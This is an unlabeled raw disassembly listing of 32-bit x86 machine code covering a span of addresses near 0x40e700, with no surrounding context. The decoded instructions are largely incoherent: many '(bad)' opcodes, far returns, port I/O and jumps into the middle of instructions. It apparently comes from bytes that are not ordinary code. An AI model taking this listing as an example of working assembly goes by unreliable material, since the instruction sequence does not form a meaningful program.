  40e68f:	push   0xffffff94
  40e691:	call   FWORD PTR [ebx+0x3b5032d0]
  40e697:	mov    ecx,DWORD PTR [edi]
  40e699:	int3   
  40e69a:	pop    esi
  40e69b:	inc    ebp
  40e69c:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e6a2:	push   ebp
  40e6a3:	xor    esi,DWORD PTR [ebx]
  40e6a5:	mov    DWORD PTR [ebx],0xcace0f9c
  40e6ab:	aas    
  40e6ac:	push   ebp
  40e6ad:	inc    ebp
  40e6ae:	xor    edx,esi
  40e6b0:	add    edx,esi
  40e6b2:	mov    eax,DWORD PTR [ebx]
  40e6b4:	(bad)  
  40e6b5:	jmp    0x40e643
  40e6b7:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  40e6bd:	rol    ah,1
  40e6bf:	mov    esi,0xf133104d
  40e6c4:	mov    edx,0xff388d80
  40e6c9:	mov    dh,0xd1
  40e6cb:	cmp    edx,DWORD PTR [ebp+0xf]
  40e6ce:	mov    eax,DWORD PTR [edx-0x20]
  40e6d1:	add    BYTE PTR [ebp-0x75],bh
  40e6d4:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e6db:	fwait
  40e6dc:	retf   0x8632
  40e6df:	cmp    ebp,0x8
  40e6e2:	call   ebx
  40e6e4:	inc    ebp
  40e6e5:	inc    ebp
  40e6e6:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e6ec:	mov    esi,DWORD PTR [ecx]
  40e6ee:	enter  0x49c,0xc7
  40e6f2:	add    al,al
  40e6f4:	add    bl,al
  40e6f6:	(bad)  
  40e6f7:	clc    
  40e6f8:	enter  0x45,0x31
  40e6fc:	push   eax
  40e6fd:	pushf  
  40e6fe:	mov    edi,eax
  40e700:	int3   
  40e701:	or     al,al
  40e703:	test   DWORD PTR [edi],edi
  40e705:	clc    
  40e706:	gs inc ebp
  40e708:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e70e:	push   ss
  40e70f:	xor    ecx,DWORD PTR [ebp+0x3]
  40e712:	sub    edx,DWORD PTR [ecx-0x76]
  40e715:	dec    ebp
  40e716:	add    DWORD PTR [ebx+0x88d845],ecx
  40e71c:	mov    esi,DWORD PTR [ebx]
  40e71e:	or     BYTE PTR [ebx],al
  40e720:	cmp    edx,DWORD PTR [ecx-0x38]
  40e723:	dec    ebp
  40e724:	out    dx,eax
  40e725:	xor    eax,DWORD PTR [ebp+0x3]
  40e728:	mov    edx,DWORD PTR [ecx-0x28]
  40e72b:	dec    ebp
  40e72c:	add    BYTE PTR [ebx],dh
  40e72e:	push   0x518003
  40e733:	push   eax
  40e734:	add    BYTE PTR [ebx-0x300748b],cl
  40e73a:	sbb    BYTE PTR [ebp+0x45],cl
  40e73d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e743:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e749:	dec    ebp
  40e74a:	inc    ebp
  40e74b:	xor    edx,esi
  40e74d:	add    edx,esi
  40e74f:	push   ecx
  40e750:	(bad)  
  40e751:	dec    ebp
  40e752:	mov    al,ds:0xc5e03dff
  40e757:	retf   
  40e758:	(bad)  
  40e759:	into   
  40e75a:	sub    bh,bh
  40e75c:	dec    esp
  40e75d:	adc    al,0x9c
  40e75f:	inc    ebp
  40e760:	push   ebp
  40e761:	test   DWORD PTR [edi],ecx
  40e763:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  40e76a:	jmp    0xc9b9f67e
  40e76f:	add    cl,dl
  40e771:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e77b:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e781:	rol    BYTE PTR [eax],0x54
  40e784:	clc    
  40e785:	gs jb  0x40e78f
  40e788:	mov    eax,DWORD PTR [ebp-0x30]
  40e78b:	xor    al,0x40
  40e78d:	sub    al,0xc7
  40e78f:	mov    ah,ch
  40e791:	add    DWORD PTR [ebp+0x4534f845],eax
  40e797:	sub    al,0x80
  40e799:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e7a0:	mov    ch,0xff
  40e7a2:	clc    
  40e7a3:	add    DWORD PTR [ebp+0x60],0x3d
  40e7a7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e7ae:	inc    ebp
  40e7af:	dec    DWORD PTR [ebx-0x341ff701]
  40e7b5:	test   esi,ecx
  40e7b7:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e7bd:	push   eax
  40e7be:	add    DWORD PTR [ebp+0x0],eax
  40e7c1:	dec    ebx
  40e7c3:	or     al,0xce
  40e7c5:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e7cc:	into   
  40e7cd:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e7d3:	mov    esi,ecx
  40e7d5:	sar    bh,0x45
  40e7d8:	adc    al,0x8b
  40e7da:	clc    
  40e7db:	fadd   DWORD PTR [ebp+0x0]
  40e7de:	mov    ebp,DWORD PTR [edx+0x8]
  40e7e1:	push   edi
  40e7e2:	adc    BYTE PTR [eax+0x1],0x83
  40e7e6:	add    al,al
  40e7e8:	retf   
  40e7e9:	mov    ecx,esi
  40e7eb:	cld    
  40e7ec:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e7f2:	into   
  40e7f3:	add    BYTE PTR [ebx+0x756aec00],cl
  40e7f9:	jne    0x40e82e
  40e7fb:	inc    DWORD PTR [ebx]
  40e7fd:	rcl    BYTE PTR [ecx+0x50],1
  40e800:	push   eax
  40e801:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e807:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e80e:	sar    bh,0x84
  40e811:	or     BYTE PTR [ebx],al
  40e813:	push   eax
  40e814:	add    BYTE PTR [ebx+0x453cc845],cl
  40e81a:	pushf  
  40e81b:	xor    edi,eax
  40e81d:	pushf  
  40e81e:	mov    ah,0x89
  40e820:	test   eax,ebp
  40e822:	clc    
  40e823:	inc    ebp
  40e824:	inc    ebp
  40e825:	mov    DWORD PTR [eax+eax*8],esi
  40e828:	sub    al,0x32
  40e82a:	mov    BYTE PTR [ebx+ecx*4+0x54d8ec89],bl
  40e831:	dec    ebp
  40e832:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e836:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  40e83c:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e840:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40e847:	shl    DWORD PTR [ebp-0x380064],1
  40e84d:	int3   
  40e84e:	lea    eax,[ebp+0x45fff860]
  40e854:	push   eax
  40e855:	cmp    al,0x75
  40e857:	pushf  
  40e858:	(bad)  
  40e859:	(bad)  
  40e85a:	pop    esp
  40e85b:	lods   al,BYTE PTR ds:[esi]
  40e85c:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e862:	mov    edi,DWORD PTR [esi]
  40e864:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e86b:	test   DWORD PTR [edi-0x8],edx
  40e86e:	inc    esi
  40e86f:	inc    ebp
  40e870:	add    BYTE PTR [eax],bh
  40e872:	push   0x8b809c
  40e877:	in     al,dx
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	mov    esi,DWORD PTR [ebx]
  40e87c:	cld    
  40e87d:	add    eax,DWORD PTR [eax+0xf013b]
  40e883:	adc    al,0x0
  40e885:	add    bh,bh
  40e887:	jmp    0xbde9a4
  40e88c:	add    BYTE PTR [ebp+0x45],cl
  40e88f:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e895:	dec    ebp
  40e896:	push   0x38033
  40e89b:	cmp    eax,DWORD PTR [eax]
  40e89d:	unpcklps xmm7,xmm0
  40e8a0:	jne    0x40e8a2
  40e8a2:	dec    DWORD PTR [ebx+0x5545cc18]
  40e8a8:	mov    DWORD PTR [ebx],esi
  40e8aa:	shl    BYTE PTR [ebx],1
  40e8ac:	inc    ebp
  40e8ad:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e8b3:	retf   0x5575
  40e8b6:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e8bc:	(bad)  
  40e8bd:	stc    
  40e8be:	in     al,dx
  40e8bf:	or     al,0x85
  40e8c1:	dec    ebp
  40e8c2:	clc    
  40e8c3:	xor    eax,DWORD PTR [ebp+0x3]
  40e8c6:	mov    ebp,ecx
  40e8c8:	rol    BYTE PTR [eax],1
  40e8ca:	inc    ebp
  40e8cb:	add    BYTE PTR [eax-0x7747ab3],bh
  40e8d1:	clc    
  40e8d2:	inc    ebp
  40e8d3:	retf   
  40e8d4:	mov    edx,ebx
  40e8d6:	in     al,dx
  40e8d7:	(bad)  
  40e8d8:	retf   
  40e8d9:	into   
  40e8da:	into   
  40e8db:	scas   eax,DWORD PTR es:[edi]
  40e8dc:	dec    ebp
  40e8dd:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e8e3:	sub    ecx,esi
  40e8e5:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e8e8:	(bad)  
  40e8e9:	mov    edi,eax
  40e8eb:	int3   
  40e8ec:	test   DWORD PTR [ecx-0x74baff08],ecx
  40e8f2:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40e8f9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e8ff:	(bad)  
  40e901:	retf   0x559c
  40e904:	(bad)  
  40e905:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40e90c:	inc    ebp
  40e90d:	add    eax,0xeb9c4d3f
  40e912:	(bad)  
  40e913:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40e919:	xor    ecx,DWORD PTR [ebp+0x33]
  40e91c:	mov    eax,DWORD PTR [ebx]
  40e91e:	call   0xce50b426
  40e923:	retf   0x55d1
  40e926:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40e92c:	jmp    0x40e927
  40e92e:	add    BYTE PTR ds:0xebf44d8b,al
  40e934:	push   ebp
  40e935:	mov    ebp,DWORD PTR [ebx]
  40e937:	mov    eax,0x33f8558b
  40e93c:	retf   
  40e93d:	xor    ecx,esi
  40e93f:	add    edx,ecx
  40e941:	add    eax,DWORD PTR [edx+0xca010f]
  40e947:	push   ebp
  40e948:	dec    ebp
  40e949:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40e94f:	stc    
  40e950:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40e95d:	xor    ebp,DWORD PTR [ebx]
  40e95f:	xor    edi,DWORD PTR [ebx]
  40e961:	add    esi,DWORD PTR [edi+0x3]
  40e964:	mov    ecx,DWORD PTR [edi]
  40e966:	clc    
  40e967:	retf   0x55cb
  40e96a:	into   
  40e96b:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40e972:	test   al,0x4d
  40e974:	push   ebp
  40e975:	jbe    0x40e9aa
  40e977:	mov    esi,DWORD PTR [ebx]
  40e979:	mov    al,0x3
  40e97b:	push   ebp
  40e97c:	add    esi,DWORD PTR [ebx]
  40e97e:	rdpmc  
  40e980:	retf   0x5503
  40e983:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40e989:	dec    ebp
  40e98a:	stc    
  40e98b:	mov    ecx,DWORD PTR [eax]
  40e98d:	or     BYTE PTR [ebp+0x4d],cl
  40e990:	jmp    0x134ea20
  40e995:	dec    ebp
  40e996:	dec    ebp
  40e997:	(bad)  
  40e998:	mov    ebx,esp
  40e99a:	clc    
  40e99b:	test   ebx,ecx
  40e99d:	clc    
  40e99e:	ror    DWORD PTR [ebp-0x2a],cl
  40e9a1:	mov    esi,ecx
  40e9a3:	lock scas eax,DWORD PTR es:[edi]
  40e9a5:	inc    ebp
  40e9a6:	mov    esi,DWORD PTR [ebx]
  40e9a8:	hlt    
  40e9a9:	pushf  
  40e9aa:	jge    0x40e937
  40e9ac:	sub    ebx,esp
  40e9ae:	cmp    ecx,ebx
  40e9b0:	ja     0x40e980
  40e9b2:	mov    ebp,DWORD PTR [eax-0x58]
  40e9b5:	dec    ebp
  40e9b6:	xor    ecx,DWORD PTR [di+0x3]
  40e9ba:	mov    esp,esp
  40e9bc:	clc    
  40e9bd:	push   ebp
  40e9be:	retf   
  40e9bf:	mov    dl,bl
  40e9c1:	adc    esi,edx
  40e9c3:	jb     0x40e993
  40e9c5:	add    BYTE PTR [edi-0xb7474b3],ch
  40e9cb:	lock jge 0x40e999
  40e9ce:	sub    ecx,DWORD PTR [ebp+0x3b]
  40e9d1:	mov    esi,DWORD PTR [edi-0x20]
  40e9d4:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  40e9db:	mov    BYTE PTR [ebx-0x34b20729],cl
  40e9e1:	mov    edx,ebx
  40e9e3:	lock (bad) 
  40e9e5:	ror    esi,cl
  40e9e7:	push   ebp
  40e9e8:	scas   eax,DWORD PTR es:[edi]
  40e9e9:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40e9ef:	fwait
  40e9f0:	sub    esi,DWORD PTR [edx]
  40e9f2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f9:	xor    esp,DWORD PTR [ebx]
  40e9fb:	add    ecx,DWORD PTR [ebp-0x1c]
  40e9fe:	mov    edi,DWORD PTR [ebp-0x8]
  40ea01:	mov    bl,cl
  40ea03:	cmp    dl,bl
  40ea05:	jb     0x40e9d5
  40ea07:	add    dh,dl
  40ea09:	dec    ebp
  40ea0a:	scas   eax,DWORD PTR es:[edi]
  40ea0b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ea11:	shr    DWORD PTR [ebx],cl
  40ea13:	into   
  40ea14:	cmp    edx,esi
  40ea16:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ea1c:	dec    ebp
  40ea1d:	dec    ebp
  40ea1e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ea24:	retf   
  40ea25:	xor    edx,esi
  40ea27:	add    ecx,esi
  40ea29:	imul   ecx,edx
  40ea2c:	mov    DWORD PTR [ebp+0x8],edx
  40ea2f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ea32:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ea38:	add    esi,DWORD PTR [ebx]
  40ea3a:	rol    BYTE PTR [ebx],0x45
  40ea3d:	rdtsc  
  40ea3f:	xlat   BYTE PTR ds:[ebx]
  40ea40:	pushf  
  40ea41:	jge    0x40e9cc
  40ea43:	xor    esp,eax
  40ea45:	sub    eax,DWORD PTR [ebp-0x73]
  40ea48:	(bad)  
  40ea49:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ea50:	dec    ebp
  40ea51:	xchg   BYTE PTR [ebx],dh
  40ea53:	inc    DWORD PTR [ebx]
  40ea55:	(bad)  
  40ea56:	jmp    0x40eaa5
  40ea58:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40ea5e:	dec    ebp
  40ea5f:	into   
  40ea60:	mov    ebp,DWORD PTR [edi-0x23737420]
  40ea66:	fwait
  40ea67:	shl    DWORD PTR [edx],cl
  40ea69:	retf   0x5588
  40ea6c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40ea72:	add    eax,DWORD PTR [eax]
  40ea74:	in     al,0x4d
  40ea76:	push   ebp
  40ea77:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40ea7d:	gs add ch,cl
  40ea80:	dec    ebp
  40ea81:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40ea87:	dec    ebp
  40ea88:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40ea8e:	jge    0x40ea5e
  40ea90:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ea96:	add    cl,dh
  40ea98:	dec    ebp
  40ea99:	dec    DWORD PTR [ebx-0x2c032301]
  40ea9f:	inc    ebp
  40eaa0:	push   ebp
  40eaa1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40eaa7:	lea    ebx,[ebx-0x7400cdac]
  40eaad:	push   eax
  40eaae:	mov    ah,0x45
  40eab0:	push   ebp
  40eab1:	mov    esi,DWORD PTR [ebx]
  40eab3:	les    esi,FWORD PTR [ebx]
  40eab5:	add    BYTE PTR [ebx],al
  40eab7:	inc    DWORD PTR [ebx]
  40eab9:	mov    ecx,DWORD PTR [edi]
  40eabb:	cld    
  40eabc:	retf   0x4d80
  40eabf:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40eac5:	jne    0x40ea52
  40eac7:	(bad)  
  40eac8:	in     al,dx
  40eac9:	ror    bl,1
  40eacb:	scas   al,BYTE PTR es:[edi]
  40eacc:	into   
  40eacd:	add    BYTE PTR [edi-0xf2f7475],ch
  40ead3:	not    bl
  40ead5:	adc    al,0xca
  40ead7:	inc    ebp
  40ead8:	push   ebp
  40ead9:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40eadf:	push   0xaf80d6
  40eae4:	mov    eax,DWORD PTR [eax]
  40eae6:	fdiv   st(7),st
  40eae8:	sti    
  40eae9:	sbb    dh,cl
  40eaeb:	pop    esi
  40eaec:	xchg   esp,eax
  40eaed:	leave  
  40eaee:	fwait
  40eaef:	add    al,0x32
  40eaf1:	push   ebp
  40eaf2:	cmp    ebp,esp
  40eaf4:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40eaf8:	dec    DWORD PTR [ecx-0x740f0375]
  40eafe:	push   ebp
  40eaff:	cld    
  40eb00:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40eb06:	retf   0x558b
  40eb09:	clc    
  40eb0a:	xor    esi,eax
  40eb0c:	add    esi,DWORD PTR [ebp-0x75]
  40eb0f:	(bad)  
  40eb10:	hlt    
  40eb11:	or     cl,BYTE PTR [esi+eax*8-0x39cdf765]
  40eb18:	mov    DWORD PTR [edx],ecx
  40eb1a:	hlt    
  40eb1b:	(bad)  
  40eb1c:	dec    ebp
  40eb1d:	add    dh,BYTE PTR [ebx]
  40eb1f:	leave  
  40eb20:	mov    edx,0xffec8d55
  40eb25:	push   ecx
  40eb26:	rol    DWORD PTR [ebp+0x55],1
  40eb29:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40eb2f:	mov    eax,0xf8030b33
  40eb34:	lar    ecx,di
  40eb37:	push   ebp
  40eb38:	retf   0x863b
  40eb3b:	jne    0x40eb3a
  40eb3d:	mov    edi,edi
  40eb3f:	or     BYTE PTR [ebp+0x41],dh
  40eb42:	mov    ebp,edx
  40eb44:	cld    
  40eb45:	inc    eax
  40eb46:	mov    al,0x25
  40eb48:	add    DWORD PTR [ecx+0x0],eax
  40eb4b:	in     eax,dx
  40eb4c:	test   DWORD PTR [ecx-0x1],eax
  40eb4f:	(bad)  
  40eb51:	ret    0x8b
  40eb54:	cld    
  40eb55:	mov    eax,DWORD PTR [eax+0x8d0151]
  40eb5b:	clc    
  40eb5c:	xor    BYTE PTR [ebp+0x45],al
  40eb5f:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40eb65:	loopne 0x40eb66
  40eb67:	mov    edi,edi
  40eb69:	mov    ecx,eax
  40eb6b:	clc    
  40eb6c:	jne    0x40eb3e
  40eb6e:	call   0x81fc77
  40eb73:	and    eax,0xc6854575
  40eb78:	je     0x40eb7b
  40eb7a:	mov    eax,esi
  40eb7c:	cld    
  40eb7d:	or     DWORD PTR [eax+0x401c9],eax
  40eb83:	push   ebp
  40eb84:	add    ah,ch
  40eb86:	add    BYTE PTR [ecx+0x6a],dl
  40eb89:	inc    ebp
  40eb8a:	push   esi
  40eb8b:	mov    DWORD PTR [eax-0x4],edx
  40eb8e:	pop    edi
  40eb8f:	mov    ebx,DWORD PTR [ebx-0x4]
  40eb92:	ret    0xb8
  40eb95:	push   es
  40eb96:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40eb9c:	clc    
  40eb9d:	lock inc ebp
  40eb9f:	jne    0x40ebf7
  40eba1:	(bad)  
  40eba2:	jne    0x40eba8
  40eba4:	mov    eax,0xf841ba66
  40eba9:	fiadd  DWORD PTR [esi]
  40ebab:	(bad)  
  40ebac:	jne    0x40ebeb
  40ebae:	cmp    eax,ebx
  40ebb0:	pop    esi
  40ebb1:	mov    ecx,DWORD PTR [eax]
  40ebb3:	push   ecx
  40ebb4:	inc    ecx
  40ebb5:	lea    edi,[esi-0x8]
  40ebb8:	inc    edx
  40ebb9:	inc    ebp
  40ebba:	int    0x8b
  40ebbc:	inc    edx
  40ebbd:	cld    
  40ebbe:	jle    0x40eb7f
  40ebc0:	inc    ecx
  40ebc1:	xchg   eax,esp
  40ebc3:	mov    ebx,eax
  40ebc5:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ebcb:	or     edi,eax
  40ebcd:	inc    ebp
  40ebce:	inc    ebp
  40ebcf:	(bad)  
  40ebd0:	mov    ecx,DWORD PTR [eax]
  40ebd2:	cld    
  40ebd3:	(bad)  
  40ebd4:	jmp    0x40ebd7
  40ebd6:	mov    eax,esi
  40ebd8:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ebde:	rcl    BYTE PTR [esi+0xf],1
  40ebe1:	iret   
  40ebe2:	inc    ebp
  40ebe3:	leave  
  40ebe4:	(bad)  
  40ebe5:	dec    DWORD PTR [ecx]
  40ebe7:	mov    eax,esi
  40ebe9:	mov    eax,DWORD PTR [edi]
  40ebeb:	mov    dh,0xdd
  40ebee:	push   es
  40ebef:	nop
  40ebf0:	(bad)  
  40ebf1:	inc    DWORD PTR [ebx]
  40ebf3:	push   esi
  40ebf4:	leave  
  40ebf5:	iret   
  40ebf6:	add    al,0x46
  40ebf8:	push   ebp
  40ebf9:	jmp    0xff9241ea
  40ebfe:	inc    ebp
  40ebff:	push   esi
  40ec00:	mov    DWORD PTR [esi-0x4],eax
  40ec03:	in     eax,dx
  40ec04:	push   ebp
  40ec05:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ec0b:	add    al,BYTE PTR [edx]
  40ec0d:	mov    edx,DWORD PTR [ebp-0x17]
  40ec10:	cmp    edi,esi
  40ec12:	jne    0x40ec13
  40ec14:	(bad)  
  40ec15:	push   esi
  40ec16:	pop    es
  40ec17:	push   ebp
  40ec18:	mov    ebp,esp
  40ec1a:	or     BYTE PTR [ebp+0x41],al
  40ec1d:	add    edi,esp
  40ec1f:	sub    BYTE PTR [eax-0x4],al
  40ec22:	retf   0xc275
  40ec25:	add    DWORD PTR [eax],eax
  40ec27:	sbb    al,0x8b
  40ec29:	mov    edx,DWORD PTR [ecx+0x14]
  40ec2c:	lea    edx,[edx-0x1ba7508]
  40ec32:	push   esi
  40ec33:	enter  0xd375,0xb8
  40ec37:	test   DWORD PTR [esi],0x6ce0750
  40ec3d:	enter  0xd375,0x3b
  40ec41:	neg    DWORD PTR [esi+0x50]
  40ec44:	or     cl,dl
  40ec46:	inc    edx
  40ec47:	(bad)  
  40ec48:	loope  0x40ec36
  40ec4a:	(bad)  
  40ec4b:	sub    eax,DWORD PTR [ebx]
  40ec4d:	inc    eax
  40ec4e:	loope  0x40eca0
  40ec50:	add    dl,BYTE PTR [eax-0x37]
  40ec53:	push   edi
  40ec54:	push   ebp
  40ec55:	imul   ah
  40ec57:	adc    DWORD PTR [ecx-0x1],0x45
  40ec5b:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ec61:	lea    edi,[eax-0x7fff4ca]
  40ec67:	mov    eax,0x4550402
  40ec6c:	cmp    ebp,ecx
  40ec6e:	jne    0x40ec1b
  40ec70:	mov    eax,DWORD PTR ds:0x241e808
  40ec76:	in     eax,dx
  40ec77:	add    BYTE PTR [eax-0x7],al
  40ec7a:	out    0x36,eax
  40ec7c:	inc    ecx
  40ec7d:	aas    
  40ec7e:	jmp    0xccaf00
  40ec83:	lock mov edi,DWORD PTR [ebp-0x18]
  40ec87:	and    edi,edi
  40ec89:	mov    edi,edi
  40ec8b:	call   0xe40eed67
  40ec90:	push   es
  40ec91:	add    al,ch
  40ec93:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40ec9a:	(bad)  
  40ec9b:	hlt    
  40ec9c:	add    eax,0xffd3e87d
  40eca1:	cmp    bh,0x8
  40eca4:	(bad)  
  40eca5:	fld    DWORD PTR [esi]
  40eca7:	out    dx,al
  40eca8:	call   0xff9febb0
  40ecad:	cmp    al,0x46
  40ecaf:	shl    eax,0x8
  40ecb2:	(bad)  
  40ecb3:	pop    es
  40ecb4:	fisttp QWORD PTR [ebp+0xe577eff]
  40ecba:	push   ebx
  40ecbb:	add    BYTE PTR [ebx+0x24008b56],cl
  40ecc1:	add    BYTE PTR [ebp+0x50],al
  40ecc4:	push   eax
  40ecc5:	add    DWORD PTR [ebx+0x757d1834],ecx
  40eccb:	sub    edx,DWORD PTR [esi-0x24]
  40ecce:	jne    0x40ec86
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	mov    edx,DWORD PTR [edx-0x34]
  40ecd4:	dec    esi
  40ecd5:	out    0x83,eax
  40ecd7:	into   
  40ecd8:	push   edi
  40ecda:	loopne 0x40ecaa
  40ecdc:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40ece0:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ece7:	rol    DWORD PTR [edx],0x8
  40ecea:	mov    esp,ecx
  40ecec:	cmp    DWORD PTR [ebx],0xc
  40ecef:	mov    esi,0x5001c0
  40ecf4:	push   eax
  40ecf5:	push   cs
  40ecf6:	push   eax
  40ecf7:	(bad)  
  40ecf8:	sub    edx,edi
  40ecfa:	push   esi
  40ecfb:	adc    al,0xcb
  40ecfd:	ins    DWORD PTR es:[edi],dx
  40ecfe:	mov    eax,0x203e8
  40ed03:	add    al,ah
  40ed05:	inc    esi
  40ed06:	mov    al,ch
  40ed08:	pop    es
  40ed09:	add    DWORD PTR [eax],0x1
  40ed0c:	add    dh,al
  40ed0e:	add    ah,ch
  40ed10:	rol    DWORD PTR [edx-0xd],1
  40ed13:	cli    
  40ed14:	push   0x4a
  40ed16:	pop    ecx
  40ed17:	retf   0xfe6
  40ed1a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ed20:	(bad)  
  40ed21:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ed27:	(bad)  
  40ed28:	sub    ebp,DWORD PTR [ebx]
  40ed2a:	and    al,0x52
  40ed2c:	(bad)  
  40ed2d:	dec    edi
  40ed2e:	inc    ebp
  40ed2f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ed36:	add    BYTE PTR [ebp-0x7b],dh
  40ed39:	pop    eax
  40ed3a:	add    BYTE PTR [edx+0x0],bl
  40ed3d:	pop    edx
  40ed3e:	dec    ebp
  40ed3f:	jmp    DWORD PTR [ebx]
  40ed41:	and    al,0xec
  40ed43:	push   edx
  40ed44:	out    0x64,eax
  40ed46:	jmp    0xd3f2e34b
  40ed4b:	jmp    0x40eda5
  40ed4d:	mov    al,0xfe
  40ed4f:	dec    BYTE PTR [ebp-0x18fd8018]
  40ed55:	add    BYTE PTR [esi+ebp*1],bh
  40ed58:	pop    edx
  40ed59:	icebp  
  40ed5a:	mov    eax,cs
  40ed5c:	ins    BYTE PTR es:[edi],dx
  40ed5d:	adc    eax,0x75510000
  40ed62:	mov    esi,0x70158
  40ed67:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ed6d:	mov    edi,esp
  40ed6f:	cld    
  40ed70:	jge    0x40ede7
  40ed72:	(bad)  
  40ed74:	aas    
  40ed75:	and    al,0x6d
  40ed77:	adc    cl,0x1
  40ed7a:	mov    eax,DWORD PTR [eax]
  40ed7c:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ed82:	dec    ebp
  40ed83:	add    eax,ebp
  40ed85:	add    BYTE PTR [edx],al
  40ed87:	fadd   DWORD PTR [eax]
  40ed89:	stc    
  40ed8a:	enter  0xee00,0x8b
  40ed8e:	sbb    eax,0x1
  40ed91:	sbb    esi,ecx
  40ed93:	in     al,0x0
  40ed95:	in     eax,dx
  40ed96:	add    BYTE PTR [eax],al
  40ed98:	jne    0x40ed25
  40ed9a:	cmp    edx,esp
  40ed9c:	jb     0x40eda7
  40ed9e:	jmp    0x40ee15
  40eda0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eda6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40edac:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40edb2:	jb     0x40ed3d
  40edb4:	pop    edx
  40edb5:	fadd   QWORD PTR [ebx-0x7445faa1]
  40edbb:	or     dh,BYTE PTR [edx+0x0]
  40edbe:	inc    edx
  40edbf:	or     dl,bh
  40edc1:	xlat   BYTE PTR ds:[ebx]
  40edc2:	dec    edx
  40edc3:	push   edi
  40edc4:	add    al,0x7
  40edc6:	leave  
  40edc7:	rol    DWORD PTR [edx+eax*1],0x7
  40edcb:	add    ecx,ecx
  40edcd:	mov    edx,ecx
  40edcf:	int3   
  40edd0:	jmp    0x40ed90
  40edd2:	mov    al,0x0
  40edd4:	(bad)  
  40edd5:	jne    0x40edbf
  40edd7:	mov    eax,DWORD PTR [edx]
  40edd9:	call   0xc1556ade
  40edde:	pop    edi
  40eddf:	add    ebx,DWORD PTR [ecx-0x37]
  40ede2:	pop    ecx
  40ede3:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40edea:	push   es
  40edeb:	mov    eax,DWORD PTR [eax]
  40eded:	int3   
  40edee:	add    ch,al
  40edf0:	jae    0x40edda
  40edf2:	int    0x1
  40edf4:	enter  0x3000,0x18
  40edf8:	add    BYTE PTR [ebp+0x75],al
